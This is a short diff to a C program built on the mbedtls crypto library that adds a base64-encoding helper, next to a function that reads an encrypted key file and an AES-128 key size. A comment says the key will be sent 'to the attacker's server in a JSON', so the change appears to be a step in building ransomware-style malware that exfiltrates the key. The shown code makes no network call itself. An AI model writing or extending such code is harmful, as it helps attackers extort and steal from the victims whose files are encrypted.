@@ -13,6 +13,7 @@
 #include "mbedtls/pk.h"
 #include "mbedtls/rsa.h"
 #include "mbedtls/md.h"
+#include "mbedtls/base64.h"
 
 /* AES-128 */
 #define KEY_SIZE    16 
@@ -143,6 +144,41 @@ static int read_encrypted_key_file(const char *key_file,
     // return key and its size
     *key_data = file_data;
     *key_size = file_size;
+    
+    return 0;
+}
+
+/* Convert binary data to base64 as we will send key to the attacker's server in a JSON */
+static int base64_encode(const unsigned char *bin_input, 
+                             size_t bin_input_len,
+                             char **base64_output, 
+                             size_t *base64_output_len) {
+    size_t written = 0;
+    
+    if (!bin_input || !base64_output || !base64_output_len || bin_input_len == 0) {
+        fprintf(stderr, "Invalid parameters\n");
+        return -1;  
+    }
+    
+    // calculate buffer size needed - mbedtls call with dst buffer = NULL and its len = 0
+    size_t buffer_size = 0;
+    mbedtls_base64_encode(NULL, 0, &buffer_size, bin_input, bin_input_len);
+    
+    // allocate buffer
+    unsigned char *buffer = malloc(buffer_size);
+    
+    // encode to base64 using mbedtls
+    if (mbedtls_base64_encode(buffer, buffer_size, &written, bin_input, bin_input_len) != 0) {
+        free(buffer);
+        fprintf(stderr, "Failed to encode to base64\n");
+        return -1;
+    }
+
+    buffer[written] = '\0';
+
+    // return string in base64 and its len
+    *base64_output = (char *)buffer;
+    *base64_output_len = written;
     
     return 0;
 }
